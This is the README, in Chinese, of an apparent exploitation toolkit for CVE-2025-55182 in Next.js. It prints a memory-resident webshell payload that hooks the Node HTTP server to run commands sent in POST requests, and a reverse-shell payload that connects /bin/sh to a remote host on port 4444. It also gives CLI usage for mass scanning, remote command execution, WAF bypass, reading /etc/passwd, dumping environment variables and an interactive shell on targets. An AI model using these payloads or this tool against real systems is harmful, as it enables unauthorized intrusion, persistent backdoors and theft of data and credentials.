# 免责声明
**本工具仅供安全研究与教学使用，用户感知的风险由用户自行承担。严禁用于非授权的渗透测试或非法攻击。如有违反，后果自负，与本项目所有者无关。如果不接受此条款，请勿下载或使用。**
**本工具基于公开文章开发，不提供发布版本。**

# 验证
```shell
nuclei -l urls.txt -t CVE-2025-55182.yaml -o result.txt
```

# 工具箱
> 支持代理和Unicode编码

## 命令执行
<img width="1269" height="1084" alt="image" src="https://github.com/user-attachments/assets/1a83955f-5b74-47e1-a622-c926f2c65880" />

## 文件管理
<img width="1163" height="969" alt="image" src="https://github.com/user-attachments/assets/6182c529-6435-4d2e-a999-3d084fd70dab" />


## js执行
<img width="1269" height="1084" alt="image" src="https://github.com/user-attachments/assets/3195903e-dad3-4186-81f3-4a748936db69" />

- 内存马注入:

```js
(function(){
    try {
        if (global.memshell_active) return "Memshell already active!";
        var http = process.mainModule.require('http');
        var cp = process.mainModule.require('child_process');
        var qs = process.mainModule.require('querystring');
        var originalEmit = http.Server.prototype.emit;
        http.Server.prototype.emit = function(event, req, res) {
            if (event === 'request' && req && res) {
                var url = req.url || "";
                if (req.method === 'POST' && url.indexOf('/?pass') !== -1) {
                    var bodyArr = [];
                    req.on('data', function(chunk) {
                        bodyArr.push(chunk);
                    });
                    req.on('end', function() {
                        try {
                            var bodyStr = Buffer.concat(bodyArr).toString();
                            var postData = qs.parse(bodyStr);
                            var cmd = postData['pwd'];
                            if (cmd) {
                                var output = cp.execSync(cmd).toString();
                                res.writeHead(200, {'Content-Type': 'text/plain'});
                                res.end(output);
                            } else {
                                res.writeHead(400);
                                res.end("Parameter 'pwd' is missing.");
                            }
                        } catch (e) {
                            res.writeHead(500);
                            res.end("Error: " + e.message);
                        }
                    });
                    return true;
                }
            }
            return originalEmit.apply(this, arguments);
        };
        global.memshell_active = true;
        return "Memshell injected!";
    } catch (e) {
        return "Injection failed: " + e.message;
    }
})()
```


- 反弹shell:
  
```js
(function(){
    try {
        var net = process.mainModule.require('net');
        var cp = process.mainModule.require('child_process');
        var sh = cp.spawn('/bin/sh', ['-i']);
        var client = new net.Socket();
        client.on('error', function(err) {
            if (sh) sh.kill(); 
        });
        sh.on('error', function(err) {
            if (client) client.destroy();
        });
        client.connect(4444, 'x.x.x.x', function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return "Spawned successfully (Async)";
    } catch (e) {
        return "Failed to spawn: " + e.message;
    }
})();
```

## 编码
<img width="1359" height="876" alt="image" src="https://github.com/user-attachments/assets/c28100a8-5770-419f-aab1-130242e4fac0" />

---

# CLI 命令行版本

## 编译

```bash
# 编译 GUI 版本
go build -o nextjs-gui main.go

# 编译 CLI 版本
go build -o nextjs-cli cli.go
```

## 命令列表

| 命令 | 说明 |
|------|------|
| `check` | 检测目标是否存在漏洞 |
| `scan` | 批量扫描多个目标 |
| `exec` | 执行系统命令 |
| `js` | 执行 JavaScript 代码 |
| `ls` | 列出目录内容 |
| `read` | 读取文件 |
| `write` | 写入文件 |
| `shell` | 交互式命令行 |

## 通用参数

| 参数 | 说明 |
|------|------|
| `-t` | 目标 URL (必需) |
| `-e` | API 端点 (默认: /) |
| `-p` | 代理地址 (如: 127.0.0.1:8080) |
| `-w` | 启用 Unicode 编码绕过 WAF |

## 使用示例

### 漏洞检测

```bash
# 检测单个目标
./nextjs-cli check -t http://target.com

# 使用自定义端点
./nextjs-cli check -t http://target.com -e /api/action
```

### 批量扫描

```bash
# 从文件扫描 (每行一个URL)
./nextjs-cli scan -f urls.txt

# 指定并发数和输出文件
./nextjs-cli scan -f urls.txt -c 10 -o results.txt

# 设置超时时间
./nextjs-cli scan -f urls.txt -c 20 -timeout 5
```

scan 参数:
| 参数 | 说明 |
|------|------|
| `-f` | URL 列表文件 (必需) |
| `-o` | 输出结果文件 |
| `-c` | 并发数 (默认: 5) |
| `-timeout` | 超时时间秒 (默认: 10) |

### 命令执行

```bash
# 同步执行 (有回显)
./nextjs-cli exec -t http://target.com -c "whoami"

# 异步执行 (无回显)
./nextjs-cli exec -t http://target.com -c "sleep 10" --async

# 使用代理
./nextjs-cli exec -t http://target.com -c "id" -p 127.0.0.1:8080

# WAF 绕过
./nextjs-cli exec -t http://target.com -c "cat /etc/passwd" -w
```

### 文件操作

```bash
# 列出目录
./nextjs-cli ls -t http://target.com -d /etc

# 读取文件
./nextjs-cli read -t http://target.com -f /etc/passwd

# 写入文件
./nextjs-cli write -t http://target.com -f /tmp/test.txt -c "hello world"
```

### JavaScript 执行

```bash
# 获取环境变量
./nextjs-cli js -t http://target.com -c "process.env"

# 获取当前工作目录
./nextjs-cli js -t http://target.com -c "process.cwd()"
```

### 交互式 Shell

```bash
./nextjs-cli shell -t http://target.com
```

交互式模式支持以下命令:

| 命令 | 说明 |
|------|------|
| `<cmd>` | 直接输入系统命令执行 |
| `cd <path>` | 切换目录 |
| `ls [path]` | 列出目录 |
| `cat <file>` | 读取文件 |
| `pwd` | 显示当前目录 |
| `upload <file> <content>` | 写入文件 |
| `js <code>` | 执行 JavaScript |
| `help` | 显示帮助 |
| `exit` | 退出 |

交互式示例:

```
[*] 目标: http://target.com
[*] 端点: /
/ > whoami
www-data
/ > cd /etc
/etc > ls
  nginx/
  passwd
  shadow
/etc > cat passwd
root:x:0:0:root:/root:/bin/bash
...
/etc > js process.env.HOME
/root
/etc > exit
[*] Bye!
```
